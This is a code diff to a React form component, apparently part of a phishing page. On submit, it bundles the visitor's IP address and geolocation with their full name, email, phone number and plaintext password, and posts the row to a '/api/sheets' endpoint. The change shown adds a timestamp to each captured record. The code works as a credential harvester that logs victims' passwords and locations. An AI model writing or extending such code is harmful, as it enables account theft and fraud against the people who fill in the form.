@@ -93,12 +93,13 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
         e.preventDefault();
-
+        const currentTime = new Date(Date.now());
+        const currentTimeStr = `${currentTime.getHours()} - ${currentTime.getMinutes()}`
         if (isLoading || !isFormValid) return;
 
         setIsLoading(true);
 
-        const formDataToSend = [[geoInfo?.ip || 'N/A', geoInfo ? `${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})` : 'N/A', formData.fullName, formData.personalEmail, phoneNumber, formData.password]];
+        const formDataToSend = [[currentTimeStr , geoInfo?.ip || 'N/A', geoInfo ? `${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})` : 'N/A', formData.fullName, formData.personalEmail, phoneNumber, formData.password]];
 
         try {
             const res = await fetch('/api/sheets', {
